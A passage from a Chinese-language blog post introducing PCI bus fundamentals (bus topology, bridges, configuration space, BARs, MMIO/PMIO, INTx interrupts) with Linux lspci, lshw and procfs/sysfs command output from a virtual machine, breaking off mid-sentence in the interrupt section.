    <content type="html"><![CDATA[<p>👴等会把你总线都给扬了</p><span id="more"></span><h1>0x00.一切开始之前</h1><p>因为笔者最近不懂为什么开始写 PCI 设备驱动了，但笔者是 <em>网络空间安全专业</em> 的本科生，此前基本上没有接触过与硬件相关联的知识（<s>因为计组和微原课讲的就是个🐓⑧</s>），所以开了这篇新的博客简要记载一些与 PCI 设备相关的基础知识、基本 Linux PCI 驱动的编写等</p><blockquote><p>为了写这篇博客，笔者翻了笔者大二上学期的计算机组成原理的课本，还翻了大二下学期的微机原理的课本，发现<strong>这两门课根本就是什么都没讲…<strong>因为也弄不到微院那边相关的教材，所以本篇博客</strong>并没有一个系统性的指导</strong>来辅助写作，都是各种东拼西凑＋笔者自己的理解，<strong>很多东西因为笔者自身水平低下的缘故只能一笔带过</strong>，因此可能会显得不够专业，希望读者见谅XD</p><blockquote><p>如果需要更为专业的参考资料请直接参考 <a href="https://www.mindshare.com/Books/Titles/PCI_Express_Technology_3.0">《PCI_Express_Technology》</a></p></blockquote><blockquote><p>以及笔者非常深刻的意识到在硬件这一块的知识笔者相比于那些专门搞硬件的人而言**确实差了很多…**只能说继续努力吧XD</p></blockquote></blockquote><h1>0x01. PCI basic knowledge</h1><h2 id="一、总线结构简述">一、总线结构简述</h2><p>我们都知道计算机的五个基本组件为：<strong>输入，输出，存储器，运算器（或数据通路），控制器</strong>。那么这几大组件之间怎么通信呢？答案是依靠<strong>系统总线</strong></p><p><strong>总线</strong>（bus）是一种将多个功能单元进行连接并允许功能单元之间进行数据交换的一种数据通路，在现代计算机中通常采用总线结构，即存在一根主要的公共通信干线，CPU 及各种设备都通过这跟总线进行通信</p><p>总线按功能可以分为以下三种类型：</p><ul><li><strong>片内总线</strong>：芯片内的总线，位于 CPU 内部，用以在寄存器与寄存器、寄存器与 ALU 之间进行数据交换</li><li><strong>系统总线</strong>：计算机系统内各功能单元（CPU、主存、I/O）之间的公共通信干线，也称之为 <em>内总线</em></li><li><strong>通信总线</strong>：用于计算机系统之间或是计算机系统与其他系统（例如远程通信设备）之间进行通信的总线，也称之为 <em>外总线</em></li></ul><p>总线是可以扩展的，即可以存在多个不同类型的总线相连，不同的设备接入到不同类型的总线上</p><p><img src="https://s2.loli.net/2022/07/21/fWTEztvhuXAqN8d.png" alt="image.png"></p><h2 id="二、PCI-概念简述">二、PCI 概念简述</h2><p>PCI 即 <code>Peripheral Component Interconnect</code>，是一种<strong>连接电脑主板和外部设备的总线标准</strong>，其通过多根 PCI bus 完成 CPU 与 多个 PCI 设备间的连接，，在 X86 硬件体系结构中几乎所有的设备都以各种形式连接到 PCI 设备树上</p><p><code>PCI express</code> 是新一代的总线标准，它沿用既有的PCI编程概念及信号标准，并且构建了更加高速的串行通信系统标准</p><p>我们首先明确 PCI 标准中的三个基本组件：</p><ul><li><strong>PCI 设备</strong>（device）：符合 PCI 总线标准的设备都可以称之为 PCI 设备，在一个 PCI 总线上可以包含多个 PCI 设备</li><li><strong>PCI 总线</strong>（bus）：用以连接多个 PCI 设备与多个 PCI 桥的通信干道</li><li><strong>PCI 桥</strong>（bridge）：总线之间的<strong>连接枢纽</strong>，主要有以下三种：<ul><li>HOST/PCI 桥：也称为 PCI 主桥或者 PCI 总线控制器，用以连接 CPU 与 PCI 根总线，<strong>隔离设备地址空间与存储器地址空间</strong>，现代 PC 通常还会在其中集成内存控制器，称之为<strong>北桥芯片组</strong>（North Bridge Chipset）</li><li>PCI/ISA 桥：用于连接旧的 ISA 总线，通常还会集成中断控制器（如 i8359A），称之为<strong>南桥芯片组</strong>（South Bridge Chipset）</li><li>PCI-to-PCI 桥：用于连接 PCI 主总线（Primary Bus）与次总线（Secondary Bus）</li></ul></li></ul><p>PCI采用树形拓扑结构，一个典型的 PCI 架构如下图所示，由一个 <code>PCI Host Bus</code> 负责总的通信， 在 Host Bus 下挂载着一个或多个 <code>PCI Root Bridge</code>，一个 <code>PCI Root Bridge</code> 管理一个 <code>PCI Local Bus</code> 空间，挂载着一颗 PCI 总线树：</p><p><img src="https://s2.loli.net/2022/08/30/LI1ayCdsB2qNWb4.png" alt="image.png"></p><p>由此，一个多层 PCI 总线结构如下图所示：</p><p><img src="https://s2.loli.net/2022/07/21/7rT3aEytb2lumZP.png" alt="image.png"></p><p>我们来看一个现实中的经典例子，以下图的 <code>Intel 440FX</code> 芯片组为例，PCI Host Bridge 分隔开了存储器域与 PCI 设备域，<strong>其分别使用独立的地址空间</strong>：</p><p><img src="https://s2.loli.net/2022/07/14/d1uhrIAYl682WSj.png" alt="image.png"></p><p>在 Linux 下我们可以使用 <code>lspci</code> 指令查看插在当前机器的 PCI bus 上的 PCI 设备，使用 <code>-t</code> 参数查看树形结构，<code>-v</code> 参数可以查看详细信息：</p><blockquote><p>这里展示的结果有 virtio 设备是因为笔者是在阿里云学生机上使用的命令，这类机器一般其实都是用 Qemu 跑的虚拟机</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci</span><br>00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)<br>00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]<br>00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]<br>00:01.2 USB controller: Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II] (rev 01)<br>00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)<br>00:02.0 VGA compatible controller: Cirrus Logic GD 5446<br>00:03.0 Ethernet controller: Red Hat, Inc. Virtio network device<br>00:04.0 Communication controller: Red Hat, Inc. Virtio console<br>00:05.0 SCSI storage controller: Red Hat, Inc. Virtio block device<br>00:06.0 Unclassified device [00ff]: Red Hat, Inc. Virtio memory balloon<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -t -v</span><br>-[0000:00]-+-00.0  Intel Corporation 440FX - 82441FX PMC [Natoma]<br>           +-01.0  Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]<br>           +-01.1  Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]<br>           +-01.2  Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II]<br>           +-01.3  Intel Corporation 82371AB/EB/MB PIIX4 ACPI<br>           +-02.0  Cirrus Logic GD 5446<br>           +-03.0  Red Hat, Inc. Virtio network device<br>           +-04.0  Red Hat, Inc. Virtio console<br>           +-05.0  Red Hat, Inc. Virtio block device<br>           \-06.0  Red Hat, Inc. Virtio memory balloon<br></code></pre></td></tr></table></figure><p>我们还可以使用 <code>lshw -businfo</code> 命令来获取设备信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo lshw -businfo</span><br>[sudo] password for arttnba3:<br>Bus info          Device       Class          Description<br>=========================================================<br>                               system         Alibaba Cloud ECS<br>                               bus            Motherboard<br>                               memory         96KiB BIOS<br>cpu@0                          processor      Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz<br>                               memory         2GiB System Memory<br>                               memory         2GiB DIMM RAM<br>pci@0000:00:00.0               bridge         440FX - 82441FX PMC [Natoma]<br>pci@0000:00:01.0               bridge         82371SB PIIX3 ISA [Natoma/Triton II]<br>pci@0000:00:01.1               storage        82371SB PIIX3 IDE [Natoma/Triton II]<br>pci@0000:00:01.2               bus            82371SB PIIX3 USB [Natoma/Triton II]<br>usb@1             usb1         bus            UHCI Host Controller<br>usb@1:1                        input          QEMU USB Tablet<br>pci@0000:00:01.3               bridge         82371AB/EB/MB PIIX4 ACPI<br>pci@0000:00:02.0               display        GD 5446<br>pci@0000:00:03.0               network        Virtio network device<br>virtio@0          eth0         network        Ethernet interface<br>pci@0000:00:04.0               communication  Virtio console<br>virtio@1                       generic        Virtual I/O device<br>pci@0000:00:05.0               storage        Virtio block device<br>virtio@2          /dev/vda     disk           42GB Virtual I/O device<br>virtio@2,1        /dev/vda1    volume         39GiB EXT4 volume<br>pci@0000:00:06.0               generic        Virtio memory balloon<br>virtio@3                       generic        Virtual I/O device<br>                               system         PnP device PNP0b00<br>                               input          PnP device PNP0303<br>                               input          PnP device PNP0f13<br>                               storage        PnP device PNP0700<br>                               communication  PnP device PNP0501<br>                  veth073b1a5  network        Ethernet interface<br>                  veth2c8670f  network        Ethernet interface<br>                  vethc0202a2  network        Ethernet interface<br>                  veth49e878e  network        Ethernet interface<br></code></pre></td></tr></table></figure><p>PCI 设备是在内核启动初始化阶段进行枚举的，这个时候可能有的设备还没准备好，从而没被枚举到，这种情况下我们可以使用如下命令重新进行设备枚举：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1&quot;</span> &gt; /sys/bus/pci/rescan</span><br></code></pre></td></tr></table></figure><h2 id="三、PCI-设备编号">三、PCI 设备编号</h2><p>每个PCI 设备都有着三个编号：<strong>总线编号（Bus Number）、设备编号（Device Number）与功能编号（Function Number）</strong>，作为设备的唯一标识；在此之上还有 <strong>PCI 域</strong>的概念，一个 PCI 域上最多可以连接 256 根 PCI 总线</p><p>当我们使用 <code>lspci</code> 命令查看 PCI 设备信息时，在每个设备开头都可以看到形如 <code>xx:yy.z</code> 的十六进制编号，这个格式其实是 <code>总线编号:设备编号.功能编号</code>，当我们使用 <code>lspci -v </code>查看 PCI 设备信息时，在总线编号前面的 4 位数字便是 PCI 域的编号</p><h2 id="四、PCI-设备配置空间">四、PCI 设备配置空间</h2><p>每个 PCI 逻辑设备中都有着其自己的<strong>配置空间</strong>（configuration space），通常是设备地址空间的前 64 字节（新版的设备还扩展了 0x40~0xFF 这段配置空间），其中存放了一些设备的基本信息，如生厂商信息、IRQ中断号、mem 空间与 io 空间的起始地址与大小等</p><p>Intel 芯片组中我们可以使用 IO 空间的 <code>CF8/CFC</code> 地址（端口）来访问 PCI 设备的配置寄存器：</p><ul><li><code>CF8</code>：<strong>CONFIG_ADDRESS</strong>，即 PCI 配置空间地址端口。</li><li><code>CFH</code>：<strong>CONFIG_DATA</strong>，即 PCI 配置空间数据端口。</li></ul><p>当我们往 <code>CONFIG_ADDRESS</code> 端口填入对应的设备标识后，就可以从 <code>CONFIG_DATA</code> 端口上读写 PCI 配置空间的内存， <code>CONFIG_ADDRESS</code> 端口的格式如下：</p><ul><li><code>31</code> 位：Enable 位</li><li><code>23:16</code> 位：总线编号</li><li><code>15:11</code> 位：设备编号</li><li><code>10:8</code> 位：功能编号</li><li><code>7:2</code> 位：配置空间寄存器编号</li><li><code>1:0</code> 位：恒为 <code>00</code></li></ul><blockquote><p>除了通过端口访问外，我们也可以通过 MMIO 的方式访问一个 PCI 设备的地址空间</p></blockquote><p>现在我们来看 PCI 配置空间的结构，PCI 设备分为 <code>Bridge</code> 与 <code>Agent</code> 两类，故配置空间也分为相应的两类</p><p>Agent 类型配置空间又被称为 <code>Type 00h</code>，格式如下图所示：</p><p><img src="https://s2.loli.net/2022/07/21/CEpqkAM1D78XRLG.png" alt="image.png"></p><p>相应地，Bridge 类型配置空间被称为 <code>Type 01h</code>，与 Agent 类型配置空间大同小异：</p><p><img src="https://s2.loli.net/2022/07/21/emyrRVo5W6X12aG.png" alt="image.png"></p><p>简单介绍几个比较重要的字段：</p><ul><li><p>设备标识相关：</p><ul><li><p><code>Vendor ID</code>：生产厂商的 ID，例如 Intel 设备通常为 <code>0x8086</code></p></li><li><p><code>Device ID</code>：具体设备的 ID，通常也是由厂家自行指定的</p></li><li><p><code>Class Code</code>：类代码，用于区分设备类型</p></li><li><p><code>Revision ID</code>：PCI 设备的版本号，可以看作 Device ID 的扩展</p></li></ul></li><li><p>设备状态相关：</p><ul><li><p><code>Status</code>：设备的状态字寄存器，各 bit 含义如下图所示：</p><p><img src="https://s2.loli.net/2022/07/21/ZTplAr87OQ96cRU.png" alt="image.png"></p></li><li><p><code>Command</code>：设备的状态字寄存器，各 bit 含义如下图所示：</p><p><img src="https://s2.loli.net/2022/07/21/rM3YhuaoPK25mNn.png" alt="image.png"></p></li></ul></li><li><p>设备配置相关：</p><ul><li><p><code>Base Address Registers</code>：决定了 PCI 设备空间映射到系统空间的具体位置，有两种映射方式：MMIO 与 PMIO，映射方式由最低位决定，不可更改</p></li><li><p><code>Interrupt Pin</code>：中断引脚，该寄存器表示设备所连接的引脚</p></li><li><p><code>Interrupt Line</code>：中断编号</p></li></ul></li></ul><p>前面我们讲到 lspci 命令，我们可以使用 <code>-s</code> 来通过指定查看的具体 PCI 设备，通过 <code>-m</code> 查看部分信息，通过 <code>-nn</code> 查看比较详细的信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -vv -s 00:02.0 -m</span><br>Device: 00:02.0<br>Class:  VGA compatible controller<br>Vendor: Cirrus Logic<br>Device: GD 5446<br>SVendor:        Red Hat, Inc.<br>SDevice:        QEMU Virtual Machine<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -vv -s 00:02.0 -nn</span><br>00:02.0 VGA compatible controller [0300]: Cirrus Logic GD 5446 [1013:00b8] (prog-if 00 [VGA controller])<br>        Subsystem: Red Hat, Inc. QEMU Virtual Machine [1af4:1100]<br>        Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR+ FastB2B- DisINTx-<br>        Status: Cap- 66MHz- UDF- FastB2B- ParErr- DEVSEL=fast &gt;TAbort- &lt;TAbort- &lt;MAbort- &gt;SERR- &lt;PERR- INTx-<br>        Region 0: Memory at fc000000 (32-bit, prefetchable) [size=32M]<br>        Region 1: Memory at febd0000 (32-bit, non-prefetchable) [size=4K]<br>        Expansion ROM at 000c0000 [disabled] [size=128K]<br>        Kernel driver in use: cirrus<br>        Kernel modules: cirrusfb, cirrus<br></code></pre></td></tr></table></figure><p>我们还可以直接使用 <code>-x</code> 参数来查看 PCI 设备的配置空间：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">lspci -s 00:02.0 -x</span><br>00:02.0 VGA compatible controller: Cirrus Logic GD 5446<br>00: 13 10 b8 00 03 01 00 00 00 00 00 03 00 00 00 00<br>10: 08 00 00 fc 00 00 bd fe 00 00 00 00 00 00 00 00<br>20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11<br>30: 00 00 bc fe 00 00 00 00 00 00 00 00 00 00 00 00<br></code></pre></td></tr></table></figure><p>在 Linux 当中我们也可以通过 procfs 或 sysfs 这样的文件系统来查看设备的相关配置信息，例如通过 <code>/proc/bus/pci/00/00.0</code> 文件我们同样可以查看 PCI 设备 <code>00:02.0</code> 的配置空间：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /proc/bus/pci/00/02.0 | xxd</span><br>00000000: 1310 b800 0301 0000 0000 0003 0000 0000  ................<br>00000010: 0800 00fc 0000 bdfe 0000 0000 0000 0000  ................<br>00000020: 0000 0000 0000 0000 0000 0000 f41a 0011  ................<br>00000030: 0000 bcfe 0000 0000 0000 0000 0000 0000  ................<br></code></pre></td></tr></table></figure><p>通过 <code>/sys/devices/pci0000:00/0000:00:02.0/resource</code> 获取到的信息中每行表示一个地址空间，其中第一行为 MMIO，第二行为 PMIO，三列信息分别为起始地址、终止地址、标志位 ，：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cat</span> /sys/devices/pci0000\:00/0000\:00\:02.0/resource</span><br>0x00000000fc000000 0x00000000fdffffff 0x0000000000042208<br>0x00000000febd0000 0x00000000febd0fff 0x0000000000040200<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x00000000000c0000 0x00000000000dffff 0x0000000000000212<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br>0x0000000000000000 0x0000000000000000 0x0000000000000000<br></code></pre></td></tr></table></figure><p>通过 <code>/sys/devices/pci0000:00/0000:00:02.0</code> 下的其他文件也可以访问该设备的一些其他资源信息（例如通过 <code>resource0</code> 可以直接访问 MMIO 空间，<code>resource1</code> 则为其 PMIO 空间）</p><h2 id="五、PCI-Base-Address-register">五、PCI Base Address register</h2><h3 id="I-基本概念">I.基本概念</h3><p><strong>Base Address register</strong>（BAR）是 PCI 设备配置空间中非常重要的一部分，该组寄存器（也称之为 BAR空间）用以定义 PCI <strong>需要的配置空间大小</strong>以及配置 PCI 设备<strong>占用的地址空间</strong></p><p>我们都知道与设备通信有两种方式：MMIO 与 Port IO，相应地 BAR 的格式也有如下两种：</p><ul><li><p><strong>MMIO</strong></p><p><img src="https://s2.loli.net/2022/07/21/CzV32oBP71at9Fg.png" alt="image.png"></p></li><li><p><strong>PMIO</strong></p><p><img src="https://s2.loli.net/2022/07/21/w4ind36EF9pPLcy.png" alt="image.png"></p></li></ul><h3 id="II-BAR-的初始化">II. BAR 的初始化</h3><p>当 PCI 设备复位后，其会在 BAR 中存放该设备所需使用的资源类型与大小，当操作系统对 PCI 总线进行配置时，首先会获取到 PCI 设备的 BAR 中的初始信息，之后根据该初始信息分配合理的 <strong>PCI 总线域地址</strong>，将其<strong>写回到 BAR 当中</strong></p><p>通过 BAR 进行资源分配的具体过程如下：</p><ul><li>当 PCI 复位时，其会向 BAR 中写入资源信息，<strong>通过将低位的 bit 设置为 read only 的 0 来标识最小地址空间大小</strong></li><li>系统软件（例如 BIOS）通过向 BAR 写一个<strong>所有 bit 都为 1 的值</strong>来确定从哪个 bit 开始是可写的，从而获取到该 BAR 对应所需的<strong>最小地址空间</strong>，同时通过最低位来获取到 BAR 的类型，并对应为这些 BAR 空间分配地址，<strong>并将分配的地址写回 BAR 空间中</strong></li></ul><blockquote><p>比如说低 20 bit 都不可写，那就是说这个 bar 所需要的地址空间最小为 1MB，最后从地址总线上分配一个1MB 对齐的地址写回 bar 里</p></blockquote><h3 id="III-处理器域与-PCI-域间访问">III. 处理器域与 PCI 域间访问</h3><p>需要注意的一点是，<strong>处理器使用存储器域的地址，而 BAR 寄存器存放 PCI 总线域的地址</strong>，因此处理器不能直接通过 <code>BAR + offset</code> 的方式访问 PCI 设备的 BAR 空间，而应当要<strong>将 PCI 总线域的地址转换为存储器域的地址</strong></p><p>由此，PCI BAR 中地址在存储器域中皆有着相应的映像，当处理器访问 PCI 设备的地址空间时，首先访问该设备在存储器域中的地址空间，之后通过 HOST 主桥将存储器域上地址空间转换为 PCI 总线域的地址空间，最后通过 PCI 总线将数据发送到指定的设备中</p><p>反之亦然，当 PCI 设备需要访问存储器域的地址空间时（DMA 操作），首先需要访问该存储器地址空间所对应的 PCI 总线空间，之后通过 HOST 主桥将其转换为存储器地址空间，再由 DDR 控制器完成对存储器的读写</p><h2 id="六、PCI-设备内存-端口空间与访问方式">六、PCI 设备内存 &amp; 端口空间与访问方式</h2><p>前面我们讲了 PCI 设备与特性和配置相关的配置空间，现在我们来看与 PCI 设备与实际操作相关的内存映射空间与端口映射空间</p><p>所有 IO 设备的内存与端口空间需要被映射到对应的地址空间/端口空间中才能访问，这需要占用部分的内存地址空间与端口地址空间，即我们有两种映射外设资源的方式：</p><ul><li><strong>MMIO</strong>（Memory-mapped I/O）：即内存映射 IO。这种方式将 IO 设备的内存与寄存器映射到指定的内存地址空间上，此时我们便可以通过常规的访问内存的方式来直接访问到设备的寄存器与内存</li><li><strong>PMIO</strong>（Port-mapped I/O）：即端口映射 IO。这种方式将 IO 设备的寄存器编码到指定的端口上，我们需要通过访问端口的方式来访问设备的寄存器与内存（例如在 x86 下通过 <code>in</code> 与 <code>out</code> 这一类的指令可以读写端口）。IO 设备通过专用的针脚或者专用的总线与 CPU 连接，这与内存地址空间相独立，因此又称作 isolated I/O</li></ul><p>完成映射之后通过相应的内存/端口访问到的便是 PCI 设备的内存/端口地址空间</p><blockquote><p>例如实模式下的 <code>0xA0000 ~ 0xBFFFF</code> 这 128KB 地址空间通常被用作显存的映射，当我们在实模式下读写这块区域时通常便是直接读写显卡上的显存，而并非普通的内存</p></blockquote><p>通过 procfs 的 <code>/proc/iomem</code> 我们可以查看物理地址空间的情况，其中我们便能看到各种设备所占用的地址空间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cat</span> /proc/iomem</span><br>00000000-00000fff : Reserved<br>00001000-0009fbff : System RAM<br>0009fc00-0009ffff : Reserved<br>000a0000-000bffff : PCI Bus 0000:00<br>000c0000-000c91ff : Video ROM<br>000c9800-000ca1ff : Adapter ROM<br>000ca800-000ccbff : Adapter ROM<br>000f0000-000fffff : Reserved<br>  000f0000-000fffff : System ROM<br>00100000-7ffdffff : System RAM<br>  1f400000-20200e70 : Kernel code<br>  20200e71-2105843f : Kernel data<br>  2132b000-217fffff : Kernel bss<br>7ffe0000-7fffffff : Reserved<br>80000000-febfffff : PCI Bus 0000:00<br>  fc000000-fdffffff : 0000:00:02.0<br>    fc000000-fdffffff : cirrus<br>  feb80000-febbffff : 0000:00:03.0<br>  febd0000-febd0fff : 0000:00:02.0<br>    febd0000-febd0fff : cirrus<br>  febd1000-febd1fff : 0000:00:03.0<br>  febd2000-febd2fff : 0000:00:04.0<br>  febd3000-febd3fff : 0000:00:05.0<br>fec00000-fec003ff : IOAPIC 0<br>fee00000-fee00fff : Local APIC<br>feffc000-feffffff : Reserved<br>fffc0000-ffffffff : Reserved<br></code></pre></td></tr></table></figure><p>通过 procfs 的 <code>/proc/ioports</code> 我们可以查看 IO 端口情况，其中便包括各种设备对应的 PMIO 端口：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cat</span> /proc/ioports</span><br>0000-0cf7 : PCI Bus 0000:00<br>  0000-001f : dma1<br>  0020-0021 : pic1<br>  0040-0043 : timer0<br>  0050-0053 : timer1<br>  0060-0060 : keyboard<br>  0064-0064 : keyboard<br>  0070-0071 : rtc0<br>  0080-008f : dma page reg<br>  00a0-00a1 : pic2<br>  00c0-00df : dma2<br>  00f0-00ff : fpu<br>  0170-0177 : 0000:00:01.1<br>    0170-0177 : ata_piix<br>  01f0-01f7 : 0000:00:01.1<br>    01f0-01f7 : ata_piix<br>  0376-0376 : 0000:00:01.1<br>    0376-0376 : ata_piix<br>  03f2-03f2 : floppy<br>  03f4-03f5 : floppy<br>  03f6-03f6 : 0000:00:01.1<br>    03f6-03f6 : ata_piix<br>  03f7-03f7 : floppy<br>  03f8-03ff : serial<br>  0505-0505 : QEMU0001:00<br>  0510-051b : QEMU0002:00<br>    0510-051b : fw_cfg_io<br>  0600-063f : 0000:00:01.3<br>    0600-0603 : ACPI PM1a_EVT_BLK<br>    0604-0605 : ACPI PM1a_CNT_BLK<br>    0608-060b : ACPI PM_TMR<br>  0700-070f : 0000:00:01.3<br>    0700-0708 : piix4_smbus<br>0cf8-0cff : PCI conf1<br>0d00-adff : PCI Bus 0000:00<br>ae0f-aeff : PCI Bus 0000:00<br>af20-afdf : PCI Bus 0000:00<br>afe0-afe3 : ACPI GPE0_BLK<br>afe4-ffff : PCI Bus 0000:00<br>  c000-c03f : 0000:00:05.0<br>    c000-c03f : virtio-pci-legacy<br>  c040-c05f : 0000:00:01.2<br>    c040-c05f : uhci_hcd<br>  c060-c07f : 0000:00:03.0<br>    c060-c07f : virtio-pci-legacy<br>  c080-c09f : 0000:00:04.0<br>    c080-c09f : virtio-pci-legacy<br>  c0a0-c0bf : 0000:00:06.0<br>    c0a0-c0bf : virtio-pci-legacy<br>  c0c0-c0cf : 0000:00:01.1<br>    c0c0-c0cf : ata_piix<br></code></pre></td></tr></table></figure><h2 id="七、PCI-中断机制">七、PCI 中断机制</h2><p>PCI 设备有两种打中断的方法：传统的 INTx 中断与 MSI 中断，出于兼容的需要 PCIe 完全继承了这个特性</p><h3 id="I-INTx-中断">I. INTx 中断</h3><p>INTx 类型的中断即传统的<strong>通过中断引脚来产生的中断</strong>，PCI 总线使用 <code>INTA#</code> 、<code>INTB#</code> 、<code>INTC#</code> 、<code>INTD#</code>  信号（低电平有效）向处理器发出中断请求，不过多数设备仅使用 <code>INTA#</code> 信号</p><p>下图为一个产生  <code>INTA#</code> 中断信号的流程：</p><ul><li>设备向南桥上的中断控制器打一个  <code>INTA#</code> ，中断控制器转为 <code>INTR</code> 信号后通过 APIC bus 打向处理器</li><li>接受中断信号的处理器（未设置则默认都打到 CPU0）通过中断向量表执行对应的处理程序</li></ul><p><img src="https://s2.loli.net/2022/08/31/32jbJDlOpRKSIqy.png" alt="image.png"></p><p>在 PCI 总线中，设备的 <code>INTx 引脚</code>最终要连接到中断控制器的 <code>IRQ 